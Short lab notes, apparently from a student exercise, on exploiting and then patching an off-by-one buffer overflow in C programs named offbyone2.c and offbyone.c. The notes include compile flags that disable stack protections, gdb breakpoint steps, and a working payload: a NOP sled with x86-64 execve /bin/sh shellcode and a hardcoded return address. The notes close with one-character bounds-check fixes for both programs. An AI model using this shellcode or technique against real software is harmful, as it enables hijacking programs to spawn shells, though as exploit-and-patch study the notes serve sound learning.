//offbyone2 is the c code used here

// compile 
gcc -g -z execstack -fno-stack-protector -no-pie -o offbyone2 offbyone2.c


exploit with gdb
gdb -q ./offbyone2

//after strcpy
b *input+47

//(long)$rbp+8-(long) start; gives 216 instead of 200
//printing 199 A's wouldnt replace the rbp
//printing 200 A's into the program should corrupt the rbp 

//run exploit code
//only work in gdb with 'return 1' commented out
run $(python2 -c 'print "\x90"*160+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*33+"\xa0\xdd\xff\xff\xff\x7f"') 


//i tried doing the same in the terminal but it does not work
//always give seg fault because the exploit code is 216 bytes


PAtCHING

for offbyone2.c 
simply change "if(strlen(argv[1])>200)" to "if(strlen(argv[1])>=200)"


for offbyone.c 
change "for(i = 0; i <= 100; i++)" to "for(i = 0; i < 100; i++)"
